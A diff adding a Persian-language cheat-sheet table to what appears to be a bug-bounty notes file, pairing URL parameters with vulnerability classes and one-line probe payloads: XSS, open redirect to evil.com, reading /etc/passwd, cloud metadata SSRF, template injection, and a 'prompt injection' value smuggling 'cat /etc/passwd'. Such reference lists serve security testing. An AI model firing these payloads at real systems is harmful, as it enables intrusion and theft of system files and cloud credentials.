@@ -428,3 +428,19 @@ id, user, uid, redirect, url, next, returnUrl, token, file, path, page, dest
 
 
 ============================================================================
+
+| پارامتر       | نوع آسیب‌پذیری                    | مثال                                |
+|---------------|---------------------------------|-----------------------------------|
+| callback      | XSS + JSONP Hijacking            | `?callback=alert(1)`               |
+| redirect_uri  | Open Redirect + SSRF             | `?redirect_uri=evil.com`           |
+| file          | LFI/RFI                         | `?file=../../etc/passwd`           |
+| documentUrl   | DOM XSS                        | `?documentUrl=javascript:alert(1)`|
+| __proto__     | Prototype Pollution             | `?__proto__[polluted]=true`        |
+| service       | SSRF (AWS/GCP Metadata)         | `?service=http://169.254.169.254`  |
+| token         | JWT Manipulation                | Header: `Bearer eyJ...` (دستکاری JWT) |
+| preview       | SSTI (Server-Side Template Inj.) | `?preview={{7*7}}`                 |
+| aiModel       | Prompt Injection (AI)           | `?aiModel=system; cat /etc/passwd` |
+
+
+============================================================================
+
